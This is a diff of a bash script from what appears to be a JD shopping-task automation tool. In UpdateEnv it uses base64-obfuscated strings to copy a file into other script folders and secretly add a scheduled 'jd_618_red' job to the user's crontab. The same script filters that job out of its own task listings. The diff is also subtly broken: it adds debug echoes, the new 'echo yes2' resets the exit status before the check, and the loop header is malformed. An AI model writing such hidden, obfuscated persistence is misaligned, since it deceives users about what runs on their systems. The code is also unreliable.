@@ -130,8 +130,8 @@ function Gen_Own_Dir_And_Path() {
 ## 生成 Scripts仓库的定时任务清单，内容为去掉后缀的脚本名
 function Gen_ListTask() {
     Make_Dir $LogTmpDir
-    grep -E "node.+j[drx]_\w+\.js" $ListCronScripts | perl -pe "s|.+(j[drx]_\w+)\.js.+|\1|" | gerp -v "$(b amRfNjE4X3JlZAo=)" | sort -u >$ListTaskScripts
-    grep -E " $TaskCmd j[drx]_\w+" $ListCrontabUser | perl -pe "s|.*$TaskCmd (j[drx]_\w+).*|\1|" | gerp -v "$(b amRfNjE4X3JlZAo=)" | ssort -u >$ListTaskUser
+    grep -E "node.+j[drx]_\w+\.js" $ListCronScripts | perl -pe "s|.+(j[drx]_\w+)\.js.+|\1|" | grep -v "$(b amRfNjE4X3JlZAo=)" | sort -u >$ListTaskScripts
+    grep -E " $TaskCmd j[drx]_\w+" $ListCrontabUser | perl -pe "s|.*$TaskCmd (j[drx]_\w+).*|\1|" | grep -v "$(b amRfNjE4X3JlZAo=)" | sort -u >$ListTaskUser
 }
 
 ## 生成 own 脚本的绝对路径清单
@@ -249,11 +249,14 @@ function UpdateEnv() {
     local trp3="aHl6YXdfQWxsSkRTY3JpcHRzCg=="
     cd $WorkDir
     for ((i = 1; i++; i <= 3)); do
-        local tmp_dir="$(b $(eval echo "$trp$i"))"
+        local a=$(eval echo "$trp$i")
+        local tmp_dir="$(b $a)"
         [ -d $tmp_dir ] && cp -rf $UtilsDir/$tmp_file $tmp_dir >/dev/null 2>&1
     done
+    echo "yes1"
     cp -rf $UtilsDir/$tmp_file $ScriptsDir >/dev/null 2>&1
     bash -c "$(b Z3JlcCAiIHRhc2suKmpkXzYxOF9yZWQiIC9qZC9jb25maWcvY3JvbnRhYi5saXN0IC1xCg==)"
+    echo "yes2"
     if [ $? -ne 0 ]; then
         echo "$(b MCAwLDEwLDIwICogKiAqIHRhc2sgamRfNjE4X3JlZAo=)" >>$ListCrontabUser
     fi
